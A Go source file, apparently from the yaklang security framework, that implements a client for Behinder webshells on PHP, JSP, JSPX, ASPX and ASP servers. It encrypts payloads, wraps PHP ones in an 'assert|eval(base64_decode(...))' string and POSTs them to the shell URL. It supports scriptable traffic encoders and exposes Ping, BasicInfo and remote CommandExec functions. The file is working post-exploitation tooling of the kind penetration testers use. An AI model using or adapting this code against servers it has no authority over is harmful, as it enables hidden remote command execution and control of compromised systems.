package wsm

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/utils/lowhttp"
	"github.com/yaklang/yaklang/common/utils/lowhttp/poc"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"github.com/yaklang/yaklang/common/wsm/payloads/behinder"
	"github.com/yaklang/yaklang/common/yak"
	"github.com/yaklang/yaklang/common/yakgrpc/ypb"
	"strings"
)

//type WsmClient interface {
//	//HTTP(opts ...lowhttp.LowhttpOpt) (*lowhttp.LowhttpResponse, error)
//	Do(req *http.Request) (*http.Response, error)
//}

type Behinder struct {
	// 连接地址
	Url string
	// 密钥
	SecretKey []byte
	// shell 类型
	ShellScript string

	Proxy string
	// response 开头的干扰字符
	respPrefixLen int
	// response 结尾的干扰字符
	respSuffixLen int
	// 自定义 header 头
	Headers              map[string]string
	PacketScriptContent  string
	PayloadScriptContent string
	customEchoEncoder    codecFunc
	customEchoDecoder    codecFunc
	customPacketEncoder  codecFunc
}

var defaultPHPEchoEncoder codecFunc = func(raw []byte) ([]byte, error) {
	classBase64Str := "\nfunction encrypt($data,$key)\n{\nif(!extension_loaded('openssl'))\n{\nfor($i=0;$i<strlen($data);$i++) {\n$data[$i] = $data[$i]^$key[$i+1&15];\n}\nreturn $data;\n}else{\nreturn openssl_encrypt($data, 'AES128' , $key);\n}\n}"
	return []byte(classBase64Str), nil
}

func NewBehinder(ys *ypb.WebShell) (*Behinder, error) {
	bs := &Behinder{
		Url:           ys.GetUrl(),
		SecretKey:     secretKey(ys.GetSecretKey()),
		ShellScript:   ys.GetShellScript(),
		Proxy:         ys.GetProxy(),
		respPrefixLen: 0,
		respSuffixLen: 0,
		Headers:       make(map[string]string, 2),
	}
	bs.setContentType()
	if ys.GetHeaders() != nil {
		bs.Headers = ys.GetHeaders()
	}
	return bs, nil
}

func (b *Behinder) echoResultEncode(raw []byte) ([]byte, error) {
	// 如果没有自定义的数据包编码器，也没有自定义的回显解码器，就代表使用的是冰蝎3 的版本
	if (b.customPacketEncoder == nil && b.customEchoDecoder == nil) && len(b.PayloadScriptContent) == 0 {
		if b.ShellScript == ypb.ShellScript_PHP.String() {
			b.customEchoEncoder = defaultPHPEchoEncoder
		}
	}
	if b.customEchoEncoder != nil {
		return b.customEchoEncoder(raw)
	}
	return b.EchoResultEncodeFormYak(raw)
}

func (b *Behinder) EchoResultEncodeFormYak(raw []byte) ([]byte, error) {
	if len(b.PayloadScriptContent) == 0 {
		return []byte(""), nil
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "EchoResultEncodeFormYak", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "EchoResultEncodeFormYak", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (b *Behinder) echoResultDecode(raw []byte) ([]byte, error) {
	if b.customEchoDecoder != nil {
		return b.customEchoDecoder(raw)
	}
	return b.EchoResultDecodeFormYak(raw)
}

func (b *Behinder) EchoResultDecodeFormYak(raw []byte) ([]byte, error) {
	if len(b.PayloadScriptContent) == 0 {
		return b.deCryption(raw)
	}
	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PayloadScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPayloadDecoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytesSlice(result)[0]

	return rspBytes, nil
}

func (b *Behinder) clientRequestEncode(raw []byte) ([]byte, error) {
	if b.customPacketEncoder != nil {
		return b.customPacketEncoder(raw)
	}
	return b.ClientRequestEncode(raw)
}
func (b *Behinder) ClientRequestEncode(raw []byte) ([]byte, error) {
	if len(b.PacketScriptContent) == 0 {
		return b.enCryption(raw)
	}

	engine, err := yak.NewScriptEngine(1000).ExecuteEx(b.PacketScriptContent, map[string]interface{}{
		"YAK_FILENAME": "req.GetScriptName()",
	})
	if err != nil {
		return nil, utils.Errorf("execute file %s code failed: %s", "req.GetScriptName()", err.Error())
	}
	result, err := engine.CallYakFunction(context.Background(), "wsmPacketEncoder", []interface{}{raw})
	if err != nil {
		return nil, utils.Errorf("import %v' s handle failed: %s", "req.GetScriptName()", err)
	}
	rspBytes := utils.InterfaceToBytes(result)

	return rspBytes, nil
}

func (b *Behinder) EchoResultEncodeFormGo(en codecFunc) {
	b.customEchoEncoder = en
}

func (b *Behinder) EchoResultDecodeFormGo(de codecFunc) {
	b.customEchoDecoder = de
}

func (b *Behinder) ClientRequestEncodeFormGo(en codecFunc) {
	b.customPacketEncoder = en
}

func (b *Behinder) ServerResponseDecode(raw []byte) ([]byte, error) {
	//TODO implement me
	panic("implement me")
}

func (b *Behinder) SetPayloadScriptContent(str string) {
	b.PayloadScriptContent = str
}

func (b *Behinder) SetPacketScriptContent(str string) {
	b.PacketScriptContent = str
}

func (b *Behinder) setContentType() {
	switch b.ShellScript {
	case ypb.ShellScript_JSP.String():
		fallthrough
	case ypb.ShellScript_JSPX.String():
		fallthrough
		//b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASPX.String():
		//b.Headers["Content-type"] = "application/octet-stream"
		b.Headers["Content-type"] = "application/json"
	case ypb.ShellScript_PHP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	case ypb.ShellScript_ASP.String():
		b.Headers["Content-type"] = "application/x-www-form-urlencoded"
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
}

func (b *Behinder) getPayload(binCode payloads.Payload, params map[string]string) ([]byte, error) {
	var rawPayload []byte
	var err error
	hexCode := payloads.HexPayload[b.ShellScript][binCode]
	switch b.ShellScript {
	case ypb.ShellScript_JSPX.String():
		fallthrough
	case ypb.ShellScript_JSP.String():
		rawPayload, err = behinder.GetRawClass(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_PHP.String():
		rawPayload, err = behinder.GetRawPHP(hexCode, params)
		if err != nil {
			return nil, err
		}
		if b.customPacketEncoder == nil && b.PacketScriptContent == "" {
			rawPayload = []byte(("assert|eval(base64_decode('" + base64.StdEncoding.EncodeToString(rawPayload) + "'));"))
		}
		//rawPayload = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
	case ypb.ShellScript_ASPX.String():
		rawPayload, err = behinder.GetRawAssembly(hexCode, params)
		if err != nil {
			return nil, err
		}
	case ypb.ShellScript_ASP.String():
		rawPayload, err = behinder.GetRawASP(hexCode, params)
		if err != nil {
			return nil, err
		}
	}
	return rawPayload, nil
}

// 原生的加密方式
func (b *Behinder) enCryption(binCode []byte) ([]byte, error) {
	return behinder.Encryption(binCode, b.SecretKey, b.ShellScript)
}

// todo  前后存在干扰字符的解密方式
func (b *Behinder) deCryption(raw []byte) ([]byte, error) {
	//var targetBts []byte
	//// 提取一下 resp raw body 中的需要的结果
	//if (b.respSuffixLen != 0 || b.respPrefixLen != 0) && len(raw)-b.respPrefixLen >= b.respSuffixLen {
	//	targetBts = raw[b.respPrefixLen : len(raw)-b.respSuffixLen]
	//} else {
	//	targetBts = raw
	//}
	return behinder.Decryption(raw, b.SecretKey, b.ShellScript)
}

func (b *Behinder) sendHttpRequest(data []byte) ([]byte, error) {
	// request body 编码操作
	data, err := b.clientRequestEncode(data)
	if err != nil {
		return nil, utils.Errorf("clientRequestEncode error: %v", err)
	}

	resp, _, err := poc.DoPOST(
		b.Url,
		poc.WithProxy(b.Proxy),
		poc.WithReplaceHttpPacketBody(data, false),
		poc.WithAppendHeaders(b.Headers),
		poc.WithSession("go0p"),
	)

	//resp, err := b.Client.Do(request)

	if err != nil {
		return nil, utils.Errorf("http request error: %v", err)
	}

	_, raw, err := lowhttp.FixHTTPResponse(resp.RawPacket)

	if len(raw) == 0 {
		return nil, utils.Errorf("empty response")
	}
	// payload 回显结果解码操作
	result, err := b.echoResultDecode(raw)

	if err != nil {
		return nil, utils.Errorf("echo decode error: %v", err)
	}

	return result, nil
}

func (b *Behinder) Unmarshal(bts []byte, m map[string]string) error {
	err := json.Unmarshal(bts, &m)
	if err != nil {
		return err
	}
	for k, v := range m {
		value, _ := base64.StdEncoding.DecodeString(v)
		m[k] = string(value)
	}

	return nil
}

func (b *Behinder) String() string {
	return fmt.Sprintf(
		"Url: %s, SecretKey: %x, ShellScript: %s, Proxy: %s, Headers: %v",
		b.Url,
		b.SecretKey,
		b.ShellScript,
		b.Proxy,
		b.Headers,
	)
}

func (b *Behinder) processParams(params map[string]string) {
	value, _ := b.echoResultEncode([]byte(""))
	if len(value) != 0 {
		if b.ShellScript == ypb.ShellScript_ASPX.String() {
			params["decoderAssemblyBase64"] = string(value)
		} else if b.ShellScript == ypb.ShellScript_JSP.String() || b.ShellScript == ypb.ShellScript_JSPX.String() {
			params["customEncoderFromClass"] = string(value)
		} else if b.ShellScript == ypb.ShellScript_PHP.String() {
			params["customEncoderFromText"] = string(value)
		}
	}
	if b.ShellScript == ypb.ShellScript_JSP.String() || b.ShellScript == ypb.ShellScript_JSPX.String() {
		for key, value := range params {
			newKey := fmt.Sprintf("{{%s}}", key)
			delete(params, key)
			params[newKey] = value
		}
	}
}

func (b *Behinder) GenWebShell() string {
	return ""
}

func (b *Behinder) processBase64JSON(input []byte) ([]byte, error) {
	var raw interface{}
	err := json.Unmarshal(input, &raw)
	if err != nil {
		return nil, err
	}

	decoded, err := decodeBase64Values(raw)
	if err != nil {
		return nil, err
	}

	// {"msg":"xxx","status":"success"}
	if decodedMap, ok := decoded.(map[string]interface{}); ok {
		if status, exists := decodedMap["status"]; exists {
			if status != "success" {
				return nil, utils.Errorf("status is not success: %v", decodedMap["msg"])
			}
		} else {
			return nil, utils.Error("status field not found in the JSON data")
		}
	} else {
		return nil, utils.Error("unexpected data format")
	}

	decodedJSON, err := json.Marshal(decoded)
	if err != nil {
		return nil, fmt.Errorf("failed to re-encode decoded data as JSON: %w", err)
	}

	return decodedJSON, nil
}

func (b *Behinder) sendRequestAndGetResponse(payloadType payloads.Payload, params map[string]string) ([]byte, error) {
	payload, err := b.getPayload(payloadType, params)
	if err != nil {
		return nil, err
	}
	bs64res, err := b.sendHttpRequest(payload)
	if err != nil {
		return nil, err
	}
	jsonByte, err := b.processBase64JSON(bs64res)
	if err != nil {
		return nil, err
	}

	return jsonByte, nil
}

func (b *Behinder) Ping(opts ...behinder.ExecParamsConfig) (bool, error) {
	randStr := utils.RandSampleInRange(50, 200)
	params := map[string]string{
		"content": randStr,
	}
	b.processParams(params)

	res, err := b.sendRequestAndGetResponse(payloads.EchoGo, params)
	if err != nil {
		return false, err
	}
	if strings.Contains(string(res), randStr) {
		return true, nil
	}
	return false, nil
}

func (b *Behinder) BasicInfo(opts ...behinder.ExecParamsConfig) ([]byte, error) {
	randStr := utils.RandSampleInRange(50, 200)
	params := map[string]string{
		"whatever": randStr,
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.BasicInfoGo, params)
}

func (b *Behinder) CommandExec(cmd string, opts ...behinder.ExecParamsConfig) ([]byte, error) {
	params := map[string]string{
		"cmd":  cmd,
		"path": "C:/",
	}
	b.processParams(params)
	return b.sendRequestAndGetResponse(payloads.CmdGo, params)
}
